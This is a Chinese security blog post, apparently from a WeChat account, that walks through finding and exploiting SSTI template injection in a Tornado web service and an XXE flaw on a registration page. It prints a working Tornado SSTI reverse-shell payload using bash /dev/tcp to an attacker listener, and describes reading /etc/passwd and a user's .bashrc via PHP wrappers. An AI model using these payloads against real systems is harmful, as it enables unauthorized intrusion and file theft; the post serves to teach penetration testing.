> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-F5atJSH7CWjVCGDmMh3FQ)

点击上方蓝字

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/oGEm9WNbjnZMFGoQKbmNX0G6k7qFxiaic23Dfics2h1yjRQcaz7N6bgEiaIrcWGgVX3f9uBjkBuf2PWXFZFDaU1EgA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1)

关注格物安全

SSTI模板注入挖掘和利用

  

  

        当我使用nmap对网站的端口和服务进行扫描的时候发现9999端口开放的web服务用的是Tornado框架。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZMFGoQKbmNX0G6k7qFxiaic2KRqqicke6VnQlZfhic6MfGfEiaGN6Kuric5w1PabmnpM17ibnDUNmOJ42vg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

        Tornado是一个python语言的web服务框架，python作为后端语言，我能想到的最有可能存在的漏洞也就是SSTI模板注入了，所以我这里随手测一下看是否有SSTI模板注入的漏洞。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZMFGoQKbmNX0G6k7qFxiaic2sEzMZEw1KMKRkTWZaZh90M9Cp2dhUTpfdzuuUZRSk0Happ5eicljHwA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如上图所示，我们可以看到服务器处理了我们8*8的计算，并返回了结果64，说明这里可能是存在SSTI模板注入漏洞的。  

知识补充：我这里给出一个模板注入通用的测试payload：

```
{{1+abcdef}}${1+abcdef}<?1+abcdef?>[1+abcdef]
```

       如果使用该payload后发现页面产生了如下图所示的报错，也是可以说明存在模板注入漏洞。  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZMFGoQKbmNX0G6k7qFxiaic2HvYn9R21Iwz5mETIoJY8xKcx54uCvsdyYbHwWSszQFhOTQPEq6eMAw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

既然我已经验证了存在SSTI模板注入，接下来我就又尝试构造了一个反弹shell的payload，尝试getshell，从而突破边界。

```
 {% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/IP/4444 0>&1"')}}    #这里的ip需要换成自己服务器的ip
```

然后我先在自己的服务器上监听了4444端口，然后我把上面的payload经过url编码后直接通过name参数传给服务器执行。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZMFGoQKbmNX0G6k7qFxiaic25XXIqRhKC5DdZk64YPcNCeXr6kezib3PrZGSaaVW5QZfTv35Aic04gSw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如上图所示我们发现shell成功反弹，我们获取到一个普通用户的权限的账号。接下来的后续操作，这里就不再记录了。  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnauxwuB07LckdGnaBO5o9xWHCrnz7NUa8OMQqOFAJOSl20axqGZUYkfypIlk8vBeYgkRkgibVbSGuA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

XXE注入漏洞挖掘与利用  

  

  

        下面这张图是我在一个网站的注册页面提交数据的时候抓的包，通过burp抓包我发现这个请求提交的数据是以xml的格式进行提交的，到这里我就有思路了，我知道这里可以测试是否存在xxe漏洞。  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZMFGoQKbmNX0G6k7qFxiaic2w8HZTJ3MvKH6OfTb018PQqsZvqNChopwO8kJhFA32KRf4n3hiaETXhw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

补充知识：XML 被设计用于传输和存储数据，XML 文档结构包括 XML 声明、 DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据 从 HTML 分离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发 生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载 恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站 等危害。

        测试是否存在xxe漏洞很重要的一个点就是我们如果我们提交的某个数据经过服务器的处理，会原封不动的显示在页面当中的时候，这个提交数据的点就很有可能会存在xxe的漏洞，而刚好当前页面提交邮箱数据的这个点就符合这个特征。  

如下图所示：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

        接下来我们通过burp抓包然后修改请求包中的内容来尝试读取/etc/passwd文件进行测试，如果成功读取到了该文件，则说明这里存在可以利用的xxe漏洞。  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

        如上图所示，我从返回包中可以看出，服务器执行了我们的读取/etc/passwd文件的请求，也就说明了这个点是存在xxe漏洞的，我们从返回包中看到了一个用户xxxx

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

        接着我又开始尝试访问xxxx用户家目录下的文件，当我访问到bash的配置文件bashrc时发现返回结果为空，然后我猜测可能是存在一些过滤的手段，然后我又尝试使用php的封装器来读取这个文件，因为bash的配置文件bashrc文件中可能会存在一些用户的敏感信息，所以我想尝试看能否返回的一些有用的信息。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  
        当我使用php的封装器来读取这个文件的时候，如下图所示发现返回包中出现了base64编码后的数据，说明这种方法成功的绕过了一些过滤，然后读取到了该文件的内容。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

本篇文章主要介绍了SSTI模板注入漏洞和XXE漏洞的常规挖掘思路及利用过程，用到的知识比较基础，希望看到本文各位大佬，轻点喷。  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**END**

【往期推荐】  

[漏洞复现 ｜ CVE-2022-24990信息泄露+RCE（POC已公开）](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247485058&idx=1&sn=91d85ed47fd15fae040cc50ac8291b31&chksm=cefbadd0f98c24c66c2d3da118da0deb174a90dd13ee7467ea2b70801c60a145bc61bc8d5024&scene=21#wechat_redirect)

```


[SpringBoot入门笔记第一篇 | 环境准备、构建项目、单元测试、热部署](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247484811&idx=1&sn=48d36d5b4947f1c360fe3bb33249e709&chksm=cefbaed9f98c27cf98a62e7ba749839cf87f0289cbf39cbdd64fcaef0121497d7c638c18ac42&scene=21#wechat_redirect)
===============================================================================================================================================================================================================================================================

[漏洞复现 ｜ CVE-2022-0847内核提权漏洞（POC已公开）](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247484884&idx=1&sn=67077df3ab3a4aec088076d39e1fe3c0&chksm=cefbae86f98c27903375ace6215cefbffb5e39ac86ee4a2a14896a9c28ed94829f757000bf84&scene=21#wechat_redirect)
===========================================================================================================================================================================================================================================================

[漏洞监控平台——Monitor(源码在文末)](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247484503&idx=1&sn=a74c742407e94d21d8d86902f6c2c3da&chksm=cefbaf05f98c2613a0d2e8ab6351806586c6642dfd8046f5e7c781c14d62b3317910a042fdcb&scene=21#wechat_redirect)
===============================================================================================================================================================================================================================================

[使用poste搭建自己的邮件服务器](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247484253&idx=1&sn=b156019b677ed15a015b2bd980faa692&chksm=cefba80ff98c2119695272cdd4d5c2a350bd9ac5c5e90271a347644db2a9b08078c9ebc80c4c&scene=21#wechat_redirect)
==========================================================================================================================================================================================================================================

[实战 | 一次杀猪盘的拿shell经历](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247484228&idx=1&sn=8999af7935ea5d46c1d9609f17b7a8fc&chksm=cefba816f98c210047362ba8ea36e98cad00b075cf52e02b83dedc56af8a8701475b74d124b2&scene=21#wechat_redirect)
============================================================================================================================================================================================================================================

[DC-1靶机实战和分析](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247484210&idx=1&sn=6645905ba6cc142682b8b29286184bec&chksm=cefba860f98c21763e6d8270c6364e9d62360ad895698f49314c19dcd857fe400a503fc685b0&scene=21#wechat_redirect)
====================================================================================================================================================================================================================================

[实战 ｜ SQL server手工注入](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247483980&idx=1&sn=aad172d8bafcac802f2c05c61515f4ec&chksm=cefba91ef98c200864510d8ad933fb59de7c84ab4ca02716504b0b1c3140143cb2d5ba8bcae4&scene=21#wechat_redirect)
============================================================================================================================================================================================================================================

[工具分享 ｜ LiqunKit 综合漏洞利用工具（下载链接在文末）](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247483950&idx=1&sn=4611cfda2c28431238e3de5506ddc1af&chksm=cefba97cf98c206ad6f718f1fe5a9d71095e1320229b5665afc170bed719684c60103688d069&scene=21#wechat_redirect)
==========================================================================================================================================================================================================================================================

[实战｜一个表白墙引发的“血案”](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247483866&idx=1&sn=6c6f7acee343533ed84e43f2a869db42&chksm=cefbaa88f98c239eae208e4fea3c0f1b05c47143df07aa4de3323cbeb3980521306dab3414ea&scene=21#wechat_redirect)
========================================================================================================================================================================================================================================




```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

「由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人承担，EXP 与 POC 仅供对已授权的目标使用测试。本文中的漏洞均为公开的漏洞收集，若文章中的敏感内容产生了部分影响，请及时联系作者删除，望师傅们谅解」